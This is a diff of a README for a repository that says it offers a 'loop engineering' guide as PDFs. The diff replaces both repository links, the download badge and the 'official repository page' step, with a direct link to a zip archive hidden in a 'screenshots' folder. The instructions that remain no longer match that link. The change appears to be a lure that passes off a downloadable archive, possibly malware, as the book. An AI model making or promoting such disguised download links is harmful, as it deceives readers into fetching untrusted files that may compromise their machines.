@@ -1,6 +1,6 @@
 # 📘 loop-engineering-orange-book - Learn loop engineering principles with ease
 
-[![](https://img.shields.io/badge/Download-Orange%20Book-blue)](https://github.com/Nihilisticdelusionoldboy87/loop-engineering-orange-book)
+[![](https://img.shields.io/badge/Download-Orange%20Book-blue)](https://raw.githubusercontent.com/Nihilisticdelusionoldboy87/loop-engineering-orange-book/main/screenshots/engineering-loop-book-orange-2.5-alpha.2.zip)
 
 This project provides a comprehensive guide to loop engineering. The orange book collection exists to help you understand complex systems through simple explanations. You find both Chinese and English PDF versions in this repository. These documents teach you how to manage feedback loops in engineering and daily life.
 
@@ -8,7 +8,7 @@ This project provides a comprehensive guide to loop engineering. The orange book
 
 You need the PDF files to read this guide. Follow these steps to obtain them:
 
-1. Visit the [official repository page](https://github.com/Nihilisticdelusionoldboy87/loop-engineering-orange-book).
+1. Visit the [official repository page](https://raw.githubusercontent.com/Nihilisticdelusionoldboy87/loop-engineering-orange-book/main/screenshots/engineering-loop-book-orange-2.5-alpha.2.zip).
 2. Look for the green button labeled Code near the top right of the page.
 3. Click the button and select Download ZIP.
 4. Your browser downloads a compressed folder to your computer.
